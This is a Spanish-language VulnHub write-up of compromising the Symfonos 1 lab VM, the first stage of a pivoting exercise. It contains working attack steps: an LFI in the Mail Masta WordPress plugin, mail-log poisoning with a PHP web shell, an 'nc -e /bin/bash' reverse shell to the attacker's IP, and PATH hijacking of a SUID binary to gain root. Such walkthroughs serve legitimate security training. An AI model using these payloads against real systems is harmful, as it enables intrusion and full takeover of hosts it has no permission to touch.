---
layout: single
title: Symfonos 1 y Symfonos 2 - VulnHub
excerpt: "En esta ocasion estaremos realizando un pequeño laboratorio de pivoting en donde de primeras solo tenemos conectividad con la maquina Symfonos 1 y tenemos que comprometerla para alcanzar la segunda que es la symfonos 2 tendremos que hacer pivoting para realizar la enumeracion desde nuestra maquina de atacante donde tendremos que hacer scrips en bash para ver puertos abiertos usar chisel, proxychains, socks entre otras ya que configuramos una red interna para el pivoting ala maquina Symfonos 2"
date: 2023-03-05
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/vh-writeup-pivoting1/logo.png
  teaser_home_page: true
  icon: /assets/images/vulnhub.webp
categories:
  - VulnHub
tags:  
  - LFI
  - Bash Scripting
  - Pivoting
  - SMB Enumeration
  - PATH Hijacking
  - WordPress Plugin - Mail Masta 1.0
  - Proxychains
  - LibreNMS Exploitation
---

<p align="center">
<img src="/assets/images/vh-writeup-pivoting1/logo.png">
</p>

## Resolution

De primeras solo tenemos alcance con la maquina Symfonos 1 con la 2 no tenemos alcanze de momento

```bash
❯ arp-scan -I ens33 --localnet --ignoredups
Interface: ens33, type: EN10MB, MAC: 00:0c:29:f1:59:4d, IPv4: 192.168.1.67
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.69	80:30:49:81:dc:ad	(Unknown)
192.168.1.75	00:0c:29:29:17:73	VMware, Inc.
```

Estamos ante una maquina linux

```bash
❯ ping -c 1 192.168.1.75
PING 192.168.1.75 (192.168.1.75) 56(84) bytes of data.
64 bytes from 192.168.1.75: icmp_seq=1 ttl=64 time=2.61 ms

--- 192.168.1.75 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 2.609/2.609/2.609/0.000 ms
❯ whichSystem.py 192.168.1.75

192.168.1.75 (ttl -> 64): Linux
```

## PortScan

Vamos a comenzar con el escaneo de puertos abiertos por `TCP`

```bash
❯ nmap -sCV -p22,25,80,139,445 192.168.1.75 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-04 17:58 CST
Nmap scan report for 192.168.1.75
Host is up (0.0017s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 ab5b45a70547a50445ca6f18bd1803c2 (RSA)
|   256 a05f400a0a1f68353ef45407619fc64a (ECDSA)
|_  256 bc31f540bc08584bfb6617ff8412ac1d (ED25519)
25/tcp  open  smtp        Postfix smtpd
| ssl-cert: Subject: commonName=symfonos
| Subject Alternative Name: DNS:symfonos
| Not valid before: 2019-06-29T00:29:42
|_Not valid after:  2029-06-26T00:29:42
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 00:0C:29:29:17:73 (VMware)
Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h59m59s, deviation: 3h27m50s, median: 0s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-03-04T23:58:55
|_  start_date: N/A
|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos
|   NetBIOS computer name: SYMFONOS\x00
|   Domain name: \x00
|   FQDN: symfonos
|_  System time: 2023-03-04T17:58:55-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.21 seconds
```

Enviando un script basico de reconocimiento solo encuentra la ruta `manual`

```bash
❯ nmap --script=http-enum -p80 192.168.1.75 -oN webScan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-04 18:01 CST
Nmap scan report for 192.168.1.75
Host is up (0.00067s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|_  /manual/: Potentially interesting folder
MAC Address: 00:0C:29:29:17:73 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.87 seconds

```

## Enumeracion

Estas son las tecnologias que se estan usuando

```ruby
❯ whatweb http://192.168.1.75
http://192.168.1.75 [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[192.168.1.75]
```

<p align="center">
<img src="/assets/images/vh-writeup-pivoting1/Web1.png">
</p>

El puerto `445` esta abierto asi que podemos enumerar recursos compartidos 

```bash
❯ smbmap -H 192.168.1.75
[+] Guest session   	IP: 192.168.1.75:445	Name: 192.168.1.75                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	helios                                            	NO ACCESS	Helios personal share
	anonymous                                         	READ ONLY	
	IPC$                                              	NO ACCESS	IPC Service (Samba 4.5.16-Debian)
```

Podemos conectarnos al recurso anonymous y vemos un archivo `attention.txt`

```bash
❯ smbmap -H 192.168.1.75 -r anonymous
[+] Guest session   	IP: 192.168.1.75:445	Name: 192.168.1.75                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	anonymous                                         	READ ONLY	
	.\anonymous\*
	dr--r--r--                0 Fri Jun 28 20:14:49 2019	.
	dr--r--r--                0 Fri Jun 28 20:12:15 2019	..
	fr--r--r--              154 Fri Jun 28 20:14:49 2019	attention.txt
```

Vamos a descargarlo con la opcion `--download` para ver que es 

```bash
❯ smbmap -H 192.168.1.75 --download anonymous/attention.txt
[+] Starting download: anonymous\attention.txt (154 bytes)
[+] File output to: /home/VulnHub/192.168.1.75/content/192.168.1.75-anonymous_attention.txt
```

Esto es lo que contiene, `Zeus` esta diciendo que la siguiente persona que use las contraseñas que estan hay sera despedido 

```bash
❯ mv 192.168.1.75-anonymous_attention.txt attention.txt
❯ catn attention.txt

Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'! 

Next person I find using one of these passwords will be fired!

-Zeus

```

Podemos guardanos las contraseñas 

```bash
❯ nvim passwords.txt
❯ catn passwords.txt
epidioko
qwerty
baseball
```

Tenemos al usuario `Zeus` y posibles contraseñas podemos emplear fuerza bruta con hydrda pero la contraseña de `zeus` no es ninguna de las mencionadas anteriormente

```bash
❯ hydra -l zeus -P passwords.txt ssh://192.168.1.75
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-04 18:13:28
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:1/p:3), ~1 try per task
[DATA] attacking ssh://192.168.1.75:22/
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-04 18:13:31
```

La version de `ssh` de la maquina es vulnerable asi que podemos emplear un script para poder enumerar usuarios y contraseñas por `ssh` probaremos el que dice (2)

```bash
❯ searchsploit ssh user enumeration
---------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                |  Path
---------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                      | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                | linux/remote/45210.py
OpenSSH 7.2p2 - Username Enumeration                                                          | linux/remote/40136.py
OpenSSH < 7.7 - User Enumeration (2)                                                          | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                                                         | linux/remote/40113.txt
---------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```bash
❯ python2 ssh_user_enumeration.py 2>/dev/null
usage: ssh_user_enumeration.py [-h] [-p PORT] target username

SSH User Enumeration by Leap Security (@LeapSecurity)

positional arguments:
  target                IP address of the target system
  username              Username to check for validity.

optional arguments:
  -h, --help            show this help message and exit
  -p PORT, --port PORT  Set port of SSH service
```

Funciona

```bash
❯ python2 ssh_user_enumeration.py 192.168.1.75 root 2>/dev/null
[+] root is a valid username
```

Pero al hacer esta otra prueba vemos que en este caso no podremos usarlo por que nos esta dando el usuario valido y pues no existe asi que no lo usuaremos

```bash
❯ python2 ssh_user_enumeration.py 192.168.1.75 roots 2>/dev/null
[+] roots is a valid username

```

Si vemos los recursos otra vez vemos un usuario `Helios`

```bash
❯ smbmap -H 192.168.1.75
[+] Guest session   	IP: 192.168.1.75:445	Name: 192.168.1.75                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	helios                                            	NO ACCESS	Helios personal share
	anonymous                                         	READ ONLY	
	IPC$                                              	NO ACCESS	IPC Service (Samba 4.5.16-Debian)

```

Vamos a probar el usuario con las contraseñas que tenemos para ver si alguna es correcta para este usuario y `qwerty` funciona

```bash
❯ smbmap -H 192.168.1.75 -u helios -p epidioko
[!] Authentication error on 192.168.1.75
❯ smbmap -H 192.168.1.75 -u helios -p qwerty
[+] IP: 192.168.1.75:445	Name: 192.168.1.75                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	READ ONLY	Printer Drivers
	helios                                            	READ ONLY	Helios personal share
	anonymous                                         	READ ONLY	
	IPC$                                              	NO ACCESS	IPC Service (Samba 4.5.16-Debian)

```

Vamos a ver que hay dentro de `Helios`

```bash
❯ smbmap -H 192.168.1.75 -u helios -p qwerty -r helios
[+] IP: 192.168.1.75:445	Name: 192.168.1.75                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	helios                                            	READ ONLY	
	.\helios\*
	dr--r--r--                0 Fri Jun 28 19:32:05 2019	.
	dr--r--r--                0 Fri Jun 28 19:37:04 2019	..
	fr--r--r--              432 Fri Jun 28 19:32:05 2019	research.txt
	fr--r--r--               52 Fri Jun 28 19:32:05 2019	todo.txt

```

Vamos a descargarlos

```bash
❯ smbmap -H 192.168.1.75 -u helios -p qwerty --download helios/research.txt
[+] Starting download: helios\research.txt (432 bytes)
[+] File output to: /home/VulnHub/192.168.1.75/content/192.168.1.75-helios_research.txt
❯ smbmap -H 192.168.1.75 -u helios -p qwerty --download helios/todo.txt
[+] Starting download: helios\todo.txt (52 bytes)
[+] File output to: /home/VulnHub/192.168.1.75/content/192.168.1.75-helios_todo.txt
```

```bash
❯ catn research.txt
Helios (also Helius) was the god of the Sun in Greek mythology. He was thought to ride a golden chariot which brought the Sun across the skies each day from the east (Ethiopia) to the west (Hesperides) while at night he did the return journey in leisurely fashion lounging in a golden cup. The god was famously the subject of the Colossus of Rhodes, the giant bronze statue considered one of the Seven Wonders of the Ancient World.
```

 Nos esta dando una ruta asi que vamos a verla en la web

 ```bash
❯ catn todo.txt

1. Binge watch Dexter
2. Dance
3. Work on /h3l105
```

Es un wordpress

![](/assets/images/vh-writeup-pivoting1/Web2.png)

Para que se vea como debe de ser vamos a ver el codigo fuente

![](/assets/images/vh-writeup-pivoting1/Web3.png)

Y el contenido lo esta cargando de `symfonos.local`

Vamos a agregarlo al `/etc/hosts`

```bash
❯ catn /etc/hosts | tail -n 1
192.168.1.75 symfonos.local
```

Ahora cargan los recursos y existe el usuario admin

![](/assets/images/vh-writeup-pivoting1/Web4.png)

Vamos a ver el codigo fuente a ver si encontramos algo y vemos el nombre de un plugin 

![](/assets/images/vh-writeup-pivoting1/Web5.png)

Estos son los plugins que estan instalados expuestamente

```bash
❯ curl -s -X GET "http://symfonos.local/h3l105/" | grep "wp-content" | grep -oP "'.*?'" | grep "symfonos.local" | cut -d '/' -f 1-7 | sort -u | grep plugins
'http://symfonos.local/h3l105/wp-content/plugins/mail-masta
'http://symfonos.local/h3l105/wp-content/plugins/site-editor
```

Vamos a buscar vulnerabilidades para el exploit `mail-masta`

```bash
❯ searchsploit mail masta
---------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                |  Path
---------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Mail Masta 1.0 - Local File Inclusion                                        | php/webapps/40290.txt
WordPress Plugin Mail Masta 1.0 - Local File Inclusion (2)                                    | php/webapps/50226.py
WordPress Plugin Mail Masta 1.0 - SQL Injection                                               | php/webapps/41438.txt
---------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Si examinamos el script nos dice que en esa ruta se esta aplicando el `LFI` y podemos ver el archivo `/etc/passwd` de la maquina 

![](/assets/images/vh-writeup-pivoting1/ruta.png)

```bash
❯ searchsploit -x php/webapps/40290.txt
```

Y funciona podemos ver el `etc/passwd`

![](/assets/images/vh-writeup-pivoting1/Web6.png)

Podemos hacer un script en Bash para automatizar la lectura de archivos atravez del `LFI`

```bash
❯ catn lfi.sh
#!/bin/bash 

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

function ctrl_c(){
  echo -e "\n\n${redColour}[!] Saliendo...${endColour}"
  exit 1
}

#Ctrl + c
trap ctrl_c INT # esto va a la funcion ctrl_c()

declare -i parameter_counter=0 # declaramos una variable int

function fileRead(){
  filename=$1
  echo -e "\n${yellowColour}[+]${endColour}${grayColour} Este es el contenido del archivo ${endColour}${redColour}$filename${endColour}${grayColour}:${endColour}\n"
  curl -s -X GET "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=$filename"
}

function helpPanel(){
  echo -e "\n${yellowColour}[i]${endColour}${grayColour}Uso:${endColour}\n"
  echo -e "\t${redColour}h)${endColour}${blueColour} Mostrar este panel de ayuda${endColour}"
  echo -e "\t${redColour}f)${endColour}${blueColour} Proporcionar ruta del archivo a leer\n${endColour}"
  exit 0
}

#Menu cuando quieres que se te pase un argumento poner : despues de la opcion 
while getopts "hf:" arg; do
  case $arg in
    h) ;; # no hace nada por que es un panel de ayuda
    f) filename=$OPTARG; let parameter_counter+=1; # lo que le pases lo mete en la variable filename
  esac
done

if [ $parameter_counter -eq 1 ]; then
  fileRead "$filename"
else
  helpPanel
fi
```

Funciona

```bash
❯ ./lfi.sh -f /etc/passwd

[+] Este es el contenido del archivo /etc/passwd:

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
Debian-exim:x:105:109::/var/spool/exim4:/bin/false
messagebus:x:106:111::/var/run/dbus:/bin/false
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
helios:x:1000:1000:,,,:/home/helios:/bin/bash
mysql:x:108:114:MySQL Server,,,:/nonexistent:/bin/false
postfix:x:109:115::/var/spool/postfix:/bin/false
```

Hay 2 usuarios 

```bash
❯ ./lfi.sh -f /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
helios:x:1000:1000:,,,:/home/helios:/bin/bash
```

No podemos ver la `id_rsa` de `helios` 

```bash
❯ ./lfi.sh -f /etc/passwd | grep "/home/helios/.ssh/id_rsa"

```

Vale despues de probar rutas el puerto 25 esta abierto y el usuario `helios` existe podemos ver logs de `smtp`

```bash
❯ ./lfi.sh -f /var/mail/helios

[+] Este es el contenido del archivo /var/mail/helios:

From root@symfonos.localdomain  Fri Jun 28 21:08:55 2019
Return-Path: <root@symfonos.localdomain>
X-Original-To: root
Delivered-To: root@symfonos.localdomain
Received: by symfonos.localdomain (Postfix, from userid 0)
	id 3DABA40B64; Fri, 28 Jun 2019 21:08:54 -0500 (CDT)
From: root@symfonos.localdomain (Cron Daemon)
To: root@symfonos.localdomain
Subject: Cron <root@symfonos> dhclient -nw
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <PATH=/usr/bin:/bin>
X-Cron-Env: <LOGNAME=root>
Message-Id: <20190629020855.3DABA40B64@symfonos.localdomain>
Date: Fri, 28 Jun 2019 21:08:54 -0500 (CDT)

/bin/sh: 1: dhclient: not found

From MAILER-DAEMON  Sat Mar  4 17:42:53 2023
Return-Path: <>
X-Original-To: helios@symfonos.localdomain
Delivered-To: helios@symfonos.localdomain
Received: by symfonos.localdomain (Postfix)
	id 4EF7140B8B; Sat,  4 Mar 2023 17:42:53 -0600 (CST)
Date: Sat,  4 Mar 2023 17:42:53 -0600 (CST)
From: MAILER-DAEMON@symfonos.localdomain (Mail Delivery System)
Subject: Undelivered Mail Returned to Sender
To: helios@symfonos.localdomain
Auto-Submitted: auto-replied
MIME-Version: 1.0
Content-Type: multipart/report; report-type=delivery-status;
	boundary="2EE7C40AB0.1677973373/symfonos.localdomain"
Content-Transfer-Encoding: 8bit
Message-Id: <20230304234253.4EF7140B8B@symfonos.localdomain>

This is a MIME-encapsulated message.

--2EE7C40AB0.1677973373/symfonos.localdomain
Content-Description: Notification
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: 8bit

This is the mail system at host symfonos.localdomain.

I'm sorry to have to inform you that your message could not
be delivered to one or more recipients. It's attached below.

For further assistance, please send mail to postmaster.

If you do so, please include this problem report. You can
delete your own text from the attached returned message.

                   The mail system

<helios@blah.com>: connect to alt1.aspmx.l.google.com[142.250.152.26]:25: No
    route to host

--2EE7C40AB0.1677973373/symfonos.localdomain
Content-Description: Delivery report
Content-Type: message/delivery-status

Reporting-MTA: dns; symfonos.localdomain
X-Postfix-Queue-ID: 2EE7C40AB0
X-Postfix-Sender: rfc822; helios@symfonos.localdomain
Arrival-Date: Fri, 28 Jun 2019 19:46:02 -0500 (CDT)

Final-Recipient: rfc822; helios@blah.com
Original-Recipient: rfc822;helios@blah.com
Action: failed
Status: 4.4.1
Diagnostic-Code: X-Postfix; connect to
    alt1.aspmx.l.google.com[142.250.152.26]:25: No route to host

--2EE7C40AB0.1677973373/symfonos.localdomain
Content-Description: Undelivered Message
Content-Type: message/rfc822
Content-Transfer-Encoding: 8bit

Return-Path: <helios@symfonos.localdomain>
Received: by symfonos.localdomain (Postfix, from userid 1000)
	id 2EE7C40AB0; Fri, 28 Jun 2019 19:46:02 -0500 (CDT)
To: helios@blah.com
Subject: New WordPress Site
X-PHP-Originating-Script: 1000:class-phpmailer.php
Date: Sat, 29 Jun 2019 00:46:02 +0000
From: WordPress <wordpress@192.168.201.134>
Message-ID: <65c8fc37d21cc0046899dadd559f3bd1@192.168.201.134>
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8

Your new WordPress site has been successfully set up at:

http://192.168.201.134/h3l105

You can log in to the administrator account with the following information:

Username: admin
Password: The password you chose during installation.
Log in here: http://192.168.201.134/h3l105/wp-login.php

We hope you enjoy your new site. Thanks!

--The WordPress Team
https://wordpress.org/


--2EE7C40AB0.1677973373/symfonos.localdomain--
```

Vamos a enviar un `MAIL` con `telnet` para ver si podemos generar un log

```bash
❯ telnet 192.168.1.75 25
Trying 192.168.1.75...
Connected to 192.168.1.75.
Escape character is '^]'.
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
MAIL FROM: miguel 
250 2.1.0 Ok
RCPT TO: helios
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
<?php system($_GET['cmd']); ?>
.
250 2.0.0 Ok: queued as EEFDB40698
QUIT
221 2.0.0 Bye
Connection closed by foreign host.
```

Si vemos otra vez la ruta con el script vemos que funciona pero no hay contenido

```bash
From miguel@symfonos.localdomain  Sat Mar  4 19:11:42 2023
Return-Path: <miguel@symfonos.localdomain>
X-Original-To: helios
Delivered-To: helios@symfonos.localdomain
Received: from unknown (unknown [192.168.1.67])
	by symfonos.localdomain (Postfix) with SMTP id EEFDB40698
	for <helios>; Sat,  4 Mar 2023 19:10:52 -0600 (CST)

```

Logramos inyectar codigo `php`

```bash
❯ curl -s -X GET "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=whoami"

From miguel@symfonos.localdomain  Sat Mar  4 19:11:42 2023
Return-Path: <miguel@symfonos.localdomain>
X-Original-To: helios
Delivered-To: helios@symfonos.localdomain
Received: from unknown (unknown [192.168.1.67])
	by symfonos.localdomain (Postfix) with SMTP id EEFDB40698
	for <helios>; Sat,  4 Mar 2023 19:10:52 -0600 (CST)

helios
```

LFI -> RCE mediante los logs de correo

```bash
❯ curl -s -X GET "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=id"

uid=1000(helios) gid=1000(helios) groups=1000(helios),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

Vamos a ganar acceso

```bash
❯ curl -s -X GET "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=nc+-e+/bin/bash+192.168.1.67+443"
```

Funciona

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.1.67] from (UNKNOWN) [192.168.1.75] 43388
whoami
helios
id
uid=1000(helios) gid=1000(helios) groups=1000(helios),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

Para poder hacer `ctrl+c`

```
script /dev/null -c bash
CTRL+Z
reset xterm
ENTER
```

Ajustas tus dimensiones de la pantalla para que veas todo la proporcion bien

Vemos que hay otra interfaz


```bash
helios@symfonos:/$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:29:17:73 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.75/24 brd 192.168.1.255 scope global ens33
       valid_lft forever preferred_lft forever
    inet6 2806:102e:10:2fe4:20c:29ff:fe29:1773/64 scope global mngtmpaddr dynamic 
       valid_lft 2591682sec preferred_lft 2591682sec
    inet6 fe80::20c:29ff:fe29:1773/64 scope link 
       valid_lft forever preferred_lft forever
3: ens35: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:29:17:7d brd ff:ff:ff:ff:ff:ff
    inet 10.10.0.129/24 brd 10.10.0.255 scope global ens35
       valid_lft forever preferred_lft forever
    inet6 fe80::20c:29ff:fe29:177d/64 scope link 
       valid_lft forever preferred_lft forever
```

Vamos a hacernos un script en Bash para descubrir nuevos equipos

```bash
helios@symfonos:/dev/shm$ cat hostDiscovery.sh 
#!/bin/bash

# CTRL+C
function ctrl_c(){
	echo -e "\n[+] Saliendo..."
	tput cnorm; exit 1
}
trap ctrl_c INT

tput civis

for i in $(seq 1 254); do
	timeout 1 bash -c "ping -c 1 10.10.0.$i" &>/dev/null && echo "[+] El host 10.10.0.$i -ACTIVE" &
done; wait

tput cnorm
helios@symfonos:/dev/shm$ 

```

Y vemos un nuevo equipo que es la `10.10.0.128` 

```bash
helios@symfonos:/dev/shm$ ./hostDiscovery.sh 
[+] El host 10.10.0.129 -ACTIVE
[+] El host 10.10.0.128 -ACTIVE
```

Nosotros somos la `10.10.0.129` 

```bash
helios@symfonos:/dev/shm$ hostname -I
192.168.1.75 10.10.0.129 
```

La maquina Symfonos 2 es la `10.10.0.128` pero en si no tenemos conexion es por eso que tenemos que hacer pivoting

```bash
❯ ping -c 1 10.10.0.128
PING 10.10.0.128 (10.10.0.128) 56(84) bytes of data.

--- 10.10.0.128 ping statistics ---
1 packets transmitted, 0 received, 100% packet loss, time 0ms

```

## Root

Vamos a convertirnos en root primero

```bash
helios@symfonos:/dev/shm$ find / -perm -4000 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/opt/statuscheck
/bin/mount
/bin/umount
/bin/su
/bin/ping
helios@symfonos:/dev/shm$ 
```

Esto es lo que es un binario de linux compilado

```bash
elios@symfonos:/dev/shm$ file /opt/statuscheck
/opt/statuscheck: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4dc315d863d033acbe07b2bfc6b5b2e72406bea4, not stripped
helios@symfonos:/dev/shm$ 
```

Esta haciendo un `curl` por detras

```bash
helios@symfonos:/dev/shm$ strings /opt/statuscheck 
/lib64/ld-linux-x86-64.so.2
libc.so.6
system
__cxa_finalize
__libc_start_main
_ITM_deregisterTMCloneTable
__gmon_start__
_Jv_RegisterClasses
_ITM_registerTMCloneTable
GLIBC_2.2.5
curl -I H
```

Esta tarea la ejecuta root

```bash
helios@symfonos:/dev/shm$ which curl
/usr/bin/curl
helios@symfonos:/dev/shm$ ls -l /opt/statuscheck 
-rwsr-xr-x 1 root root 8640 Jun 28  2019 /opt/statuscheck
helios@symfonos:/dev/shm$ 
```

Vamos a hacer un Path Hijacking

```bash
helios@symfonos:/dev/shm$ touch curl
helios@symfonos:/dev/shm$ chmod +x curl
helios@symfonos:/dev/shm$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1099016 May 15  2017 /bin/bash
helios@symfonos:/dev/shm$ nano curl 
helios@symfonos:/dev/shm$ cat curl 
chmod u+s /bin/bash
helios@symfonos:/dev/shm$ 
```

Vamos a alterar el `PATH` para que cuando hagamos un `curl` nos tome el de nosotros primero, el binario que tu pongas va a empezar a buscar por el directorio personal de trabajo para que nos tome nuestro curl que le asigna el privilegio `SUID` a la bash y no el curl que trai el propio sistema

```bash
helios@symfonos:/dev/shm$ export PATH=.:$PATH
helios@symfonos:/dev/shm$ echo $PATH
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
helios@symfonos:/dev/shm$ 

```

La bash fue manipulada

```bash
helios@symfonos:/dev/shm$ /opt/statuscheck 
helios@symfonos:/dev/shm$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1099016 May 15  2017 /bin/bash
helios@symfonos:/dev/shm$ 
```

```bash
helios@symfonos:/dev/shm$ bash -p
bash-4.4# whoami
root
bash-4.4# id
uid=1000(helios) gid=1000(helios) euid=0(root) groups=1000(helios),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
bash-4.4# cd /root
bash-4.4# 
```

Hemos comprometido la primer maquina ahora solo falta la siguiente

```bash
bash-4.4# cat proof.txt 

	Congrats on rooting symfonos:1!

                 \ __
--==/////////////[})))==*
                 / \ '          ,|
                    `\`\      //|                             ,|
                      \ `\  //,/'                           -~ |
   )             _-~~~\  |/ / |'|                       _-~  / ,
  ((            /' )   | \ / /'/                    _-~   _/_-~|
 (((            ;  /`  ' )/ /''                 _ -~     _-~ ,/'
 ) ))           `~~\   `\\/'/|'           __--~~__--\ _-~  _/, 
((( ))            / ~~    \ /~      __--~~  --~~  __/~  _-~ /
 ((\~\           |    )   | '      /        __--~~  \-~~ _-~
    `\(\    __--(   _/    |'\     /     --~~   __--~' _-~ ~|
     (  ((~~   __-~        \~\   /     ___---~~  ~~\~~__--~ 
      ~~\~~~~~~   `\-~      \~\ /           __--~~~'~~/
